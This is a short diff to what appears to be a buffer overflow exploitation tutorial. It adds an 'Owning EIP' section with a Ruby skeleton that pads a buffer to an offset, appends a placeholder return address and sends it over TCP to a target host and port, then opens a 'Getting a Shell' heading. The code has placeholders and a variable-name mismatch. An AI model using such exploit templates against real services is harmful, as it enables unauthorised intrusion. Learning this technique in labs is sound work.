@@ -53,3 +53,13 @@ TCPSocket.open(RHOST,RPORT){ |s| s.puts buff}
 ```
 ### Owning EIP
 ```Ruby
+buffer = "A" * (Offset Value)
+buffer += #Address of EIP
+RHOST = #IP address of the target machine, example: "10.10.10.0"
+RPORT = #Port number of the target machine, example: 21
+
+require 'socket'
+
+TCPSocket.open(RHOST,RPORT){ |s| s.puts buff}
+```
+### Getting a Shell
